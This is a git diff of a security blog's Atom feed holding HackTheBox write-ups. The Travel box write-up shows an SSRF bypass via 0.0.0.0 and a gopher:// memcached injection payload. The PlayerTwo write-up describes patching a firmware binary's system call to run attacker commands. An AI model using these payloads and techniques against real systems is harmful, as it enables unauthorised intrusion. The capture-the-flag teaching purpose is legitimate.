class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Leaked puts address: 0x%x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;# Part two
@@ -637,7 +726,7 @@ spawn.sh
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=kUk5pw4w0h4&quot;&gt;LiveOverflow&lt;/a&gt; explaining PLT and GOT&lt;/li&gt;
   &lt;li&gt;This &lt;a href=&quot;https://0xdf.gitlab.io/2019/10/19/htb-ellingson.html#overflow-protections&quot;&gt;write-up&lt;/a&gt; of the box &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ellingson&lt;/code&gt; from &lt;a href=&quot;https://app.hackthebox.eu/users/4935&quot;&gt;0xdf&lt;/a&gt; was very helpful to me.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Philipp Menner</name></author><category term="challenges" /><category term="ROP" /><category term="pwn" /><summary type="html">A challenge to practice return-oriented programming.</summary></entry><entry><title type="html">Write-up: HackTheBox - Travel</title><link href="http://localhost:4000/boxes/travel/" rel="alternate" type="text/html" title="Write-up: HackTheBox - Travel" /><published>2020-06-29T21:33:36-04:00</published><updated>2020-06-29T21:33:36-04:00</updated><id>http://localhost:4000/boxes/travel</id><content type="html" xml:base="http://localhost:4000/boxes/travel/">&lt;h1 id=&quot;starting-the-travel---overview&quot;&gt;Starting the travel - Overview&lt;/h1&gt;
+&lt;/ul&gt;</content><author><name>Philipp Menner</name></author><category term="challenges" /><category term="ROP" /><category term="pwn" /><summary type="html">A challenge to practice return-oriented programming.</summary></entry><entry><title type="html">Write-up: HackTheBox - Travel</title><link href="https://vpm.rocks/boxes/travel/" rel="alternate" type="text/html" title="Write-up: HackTheBox - Travel" /><published>2020-06-29T21:33:36-04:00</published><updated>2020-06-29T21:33:36-04:00</updated><id>https://vpm.rocks/boxes/travel</id><content type="html" xml:base="https://vpm.rocks/boxes/travel/">&lt;h1 id=&quot;starting-the-travel---overview&quot;&gt;Starting the travel - Overview&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;&lt;a href=&quot;https://app.hackthebox.eu/machines/Travel&quot;&gt;Travel&lt;/a&gt; is an interesting box created by &lt;a href=&quot;https://app.hackthebox.eu/users/77141&quot;&gt;jkr&lt;/a&gt; and his team member &lt;a href=&quot;https://app.hackthebox.eu/users/13569&quot;&gt;xct&lt;/a&gt;. It required some fuzzing and enumerating to get a foothold, exploiting memcached abusing a SSRF vulnerability and finally modifying users by taking advantage of our LDAP privileges.&lt;/p&gt;
 &lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
 &lt;p&gt;Since &lt;a href=&quot;#Nmap scan&quot;&gt;the nmap scan&lt;/a&gt; just shows ssh, http and https as open, we browse to 10.10.10.189 and the landing page not only gives away the domain name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;travel.htb&lt;/code&gt; but also mentions a blog site, so scanning for subdomains is the next logical step:&lt;/p&gt;
@@ -680,14 +769,14 @@ template.php		&lt;span class=&quot;c&quot;&gt;# Contains class `TemplateHelper` 
 &lt;p class=&quot;text-justify&quot;&gt;The next steps all revolve around these three files so reading them thoroughly is definitely recommended.
 If we look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rss_template.php&lt;/code&gt; more closely we see what the mitigations mentioned in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;safe&lt;/code&gt; function of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;template.php&lt;/code&gt; are for:&lt;/p&gt;
 &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# From rss_template.php&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'QUERY_STRING'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'QUERY_STRING'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;custom_feed_url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# Searches the URL for the first occurence of `custom_feed_url`&lt;/span&gt;
                 &lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# break URL into two parts&lt;/span&gt;
                 &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;# set $url to the string after the '='&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;				&lt;span class=&quot;c1&quot;&gt;# if no custom feed was specified use the following one:&lt;/span&gt;
                 &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-         &lt;span class=&quot;nv&quot;&gt;$feed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;get_feed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;# call get_feed rss&lt;/span&gt;
+         &lt;span class=&quot;nv&quot;&gt;$feed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_feed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;# call get_feed rss&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;So reading the code, we can apparently specify a custom feed url. To test this we set up a local http server and try to access it browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://blog.travel.htb/awesome-rss/?custom_feed_url=http://IP:8000/&lt;/code&gt; and we record a GET request:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server
@@ -695,20 +784,20 @@ Serving HTTP on 0.0.0.0 port 8000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
 10.10.10.189 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01/AUG/2020 10:25:32] &lt;span class=&quot;s2&quot;&gt;&quot;GET / HTTP/1.1&quot;&lt;/span&gt; 200 -
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Therefore we have a server side request forgery (SSRF) vulnerability, lets see what we can request by looking at how the content is processed:&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;url_get_contents&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;safe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url_get_contents&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;safe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
         &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;$pl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;curl &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$pl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;curl &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
         &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# in short:&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;curl &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;curl &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;As this is a simple curl call and the input is sanitized via escapeshellarg, I was not able to use this to upload a shell. 
 Looking further at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;safe&lt;/code&gt; function from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;temlpate.php&lt;/code&gt; we see a comment &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;// this should be secure&lt;/code&gt; hinting, that it’s probably not secure. So where can we do something forbidden?
 Playing around a little bit and searching the web &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery&quot;&gt;I found out&lt;/a&gt; that we can circumvent the localhost restriction using the IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt;. What do we want to access on localhost? Well, looking at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rss_template.php&lt;/code&gt; again, we see that there is a connection established to a memcached service via&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$simplepie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set_cache_location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'memcache://127.0.0.1:11211/?timeout=60&amp;amp;prefix=xct_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$simplepie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;set_cache_location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'memcache://127.0.0.1:11211/?timeout=60&amp;amp;prefix=xct_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Searching now for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcached SSRF&lt;/code&gt; I found the tool &lt;a href=&quot;https://github.com/tarunkant/Gopherus&quot;&gt;Gopherus&lt;/a&gt; which came in handy to create payloads. Following through the steps, choosing the default payload and changing the IP from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt; results in the following string, which we enter as the custom feed url:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gopher://0.0.0.0:11211/_%0d%0aset%20SpyD3r%204%200%2016%0d%0aO:5:%22Hello%22:0:%7B%7D%0d%0a
@@ -916,7 +1005,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 &lt;p&gt;&lt;a name=&quot;[3]&quot;&gt;[3]&lt;/a&gt; &lt;a href=&quot;https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a&quot;&gt;Post on exploiting PHP deserialization&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a name=&quot;[4]&quot;&gt;[4]&lt;/a&gt; &lt;a href=&quot;https://www.unserialize.com/&quot;&gt;Tool to view your serialized string&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="memcached" /><category term="docker" /><category term="ldap" /><summary type="html">Cool box with little guessing and much to learn.</summary></entry><entry><title type="html">Write-up: HackTheBox - PlayerTwo</title><link href="http://localhost:4000/boxes/player2/" rel="alternate" type="text/html" title="Write-up: HackTheBox - PlayerTwo" /><published>2020-06-26T21:33:36-04:00</published><updated>2020-06-26T21:33:36-04:00</updated><id>http://localhost:4000/boxes/player2</id><content type="html" xml:base="http://localhost:4000/boxes/player2/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;&lt;a name=&quot;[4]&quot;&gt;[4]&lt;/a&gt; &lt;a href=&quot;https://www.unserialize.com/&quot;&gt;Tool to view your serialized string&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="memcached" /><category term="docker" /><category term="ldap" /><summary type="html">Cool box with little guessing and much to learn.</summary></entry><entry><title type="html">Write-up: HackTheBox - PlayerTwo</title><link href="https://vpm.rocks/boxes/player2/" rel="alternate" type="text/html" title="Write-up: HackTheBox - PlayerTwo" /><published>2020-06-26T21:33:36-04:00</published><updated>2020-06-26T21:33:36-04:00</updated><id>https://vpm.rocks/boxes/player2</id><content type="html" xml:base="https://vpm.rocks/boxes/player2/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;&lt;a href=&quot;https://app.hackthebox.eu/machines/PlayerTwo&quot;&gt;PlayerTwo&lt;/a&gt; is MrR3boot’s follow-up box to his box &lt;em&gt;Player&lt;/em&gt; - this time created in collaboration with b14ckh34rt.
 It requires quite a bit of fuzzing and research on twirp to start the box, a little bit of binary exploitation for user and and even more so to get root without cheat codes.&lt;/p&gt;
 
@@ -932,14 +1021,10 @@ PORT     STATE SERVICE
 Besides explaining what went wrong on the predecessor box player it showcases why the new product is much better. It mentions a &lt;em&gt;protobs protocol&lt;/em&gt; and leads us to a subdomain at&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://product.player2.htb&lt;/code&gt; revealing a login page after adding the subdomain to /etc/hosts also. After trying a few standard username/password combinations such as admin/admin and a SQLi test we move on.
 Fuzzing in the background for subdirectories on domain and subdomain show the following (bit shortened) results, the underlined directories will be important later on:&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/Gobuster.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Gobuster.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u player2.htb&lt;/code&gt; and &lt;br /&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u product.player2.htb&lt;/code&gt; respectively.
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;h2 id=&quot;twirp&quot;&gt;Twirp&lt;/h2&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://player2.htb:8545&lt;/code&gt; gives away the service running on this port with the following response:&lt;/p&gt;
@@ -952,14 +1037,10 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;The just found &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://player2.htb/proto/generated.proto&lt;/code&gt; file outlines the design of the service in use, which is basically identical to the structure of the example in the documentation &lt;a href=&quot;#[0]&quot;&gt;[0]&lt;/a&gt;:&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/Twirp.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Twirp.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       A comparison between the Protobuf definition file of PlayerTwo and from the documentation of &lt;em&gt;twirp&lt;/em&gt;.
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;p&gt;So we can deduce from the file that the service in use is an auth service and furthermore on &lt;a href=&quot;#0&quot;&gt;[0]&lt;/a&gt; the format of the endpoint is specified as&lt;/p&gt;
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /twirp/&lt;span class=&quot;nt&quot;&gt;&amp;lt;package&amp;gt;&lt;/span&gt;.&lt;span class=&quot;nt&quot;&gt;&amp;lt;Service&amp;gt;&lt;/span&gt;/&lt;span class=&quot;nt&quot;&gt;&amp;lt;Method&amp;gt;&lt;/span&gt;
@@ -980,14 +1061,10 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Trying these creds on the login page found earlier we are greeted by a two factor authorization!&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/2fa.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/2fa.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;p class=&quot;text-justify&quot;&gt;As we probably have no chance of guessing the right pin and brute-froce is never an option on HTB, we fuzz again, this time &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://product.player2.htb/api&lt;/code&gt;. And with using a suitable wordlist we finally find another endpoint:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; product.player2.htb/api
@@ -1010,19 +1087,13 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
 &lt;h2 id=&quot;protobs-part-1&quot;&gt;Protobs Part 1&lt;/h2&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Exploring the web page we find the following section which links to a documentation of the &lt;em&gt;Protobs Firmware&lt;/em&gt; which includes a link to the firmware itself, as well as a link to a file upload:&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/ProtobsAccess.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-&lt;/figure&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/ProtobsAccess.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;/figure&gt;
 
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/Doc.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-&lt;/figure&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Doc.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;/figure&gt;
 
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/FileUpload.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-&lt;/figure&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/FileUpload.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;/figure&gt;
 
 &lt;p&gt;Unpacking the tar file gives us for the most part a binary called &lt;em&gt;Protobs.bin&lt;/em&gt;:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x Protobs.bin 	&lt;span class=&quot;c&quot;&gt;# making it executable&lt;/span&gt;
@@ -1046,27 +1117,19 @@ Protobs.removed: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&qu
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;By removing the first 64 bytes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command now recognizes the binary as an ELF 64-bit executable but also the code in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt; is now much more readable:&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/assets/images/playerTwo/Firmware.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
-  
-    &lt;figcaption&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Firmware.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;&lt;figcaption&gt;
       The firmware reverse engineered in &lt;em&gt;Ghidra&lt;/em&gt;. Every time the binary gets executed, the main function calls &lt;em&gt;wait_for_fkey&lt;/em&gt; in which we see multiple system calls.
 
-    &lt;/figcaption&gt;
-  
-&lt;/figure&gt;
+    &lt;/figcaption&gt;&lt;/figure&gt;
 
 &lt;p class=&quot;text-justify&quot;&gt;Following the path of execution when the binary is run we see multiple system calls inside the &lt;em&gt;wait_for_fkey&lt;/em&gt; function. System calls are dangerous because they directly execute the argument on the system the binary is executed on, therefore, if we can run the binary on the remote machine and overwrite the system call to something that is useful for us as an attacker we win.
 Quoting the sentence below the file upload, it says that the firmware is sign tested on whether it is signed and working as intended, so we have chance that it will be executed after uploading. The latter part is doable with a hexeditor and we have a couple of options on what to overwrite the argument with. A simple test to check if the binary is executed after uploading would be to put a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping -c 4 your_ip&lt;/code&gt; in there and listen to incoming packages with &lt;em&gt;tcpdump&lt;/em&gt;.
 To do this we need to load the original binary into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt; and search for the first system call within the &lt;em&gt;wait_for_fkey&lt;/em&gt; function, identify the address &lt;em&gt;20e4&lt;/em&gt; and search that address in a hex editor of choice we loaded the binary in. We then replace the original by the ASCII code of our payload:&lt;/p&gt;
